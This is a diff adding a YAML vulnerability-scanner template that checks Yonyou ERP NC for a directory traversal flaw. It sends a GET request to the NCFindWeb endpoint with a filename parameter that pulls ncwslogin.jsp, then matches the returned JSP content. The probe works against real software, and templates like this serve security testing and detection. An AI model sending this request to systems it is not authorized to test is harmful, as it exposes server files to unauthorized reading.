@@ -1,0 +1,19 @@
+id: yongyou-erp-nc-directory-traversal
+info:
+  name: "用友ERP NC NCFindWeb接口目录遍历漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: yongyou-erp-nc
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=ncwslogin.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<jsp:forward page=\"WEB-INF/jsp/resolution.jsp\">"
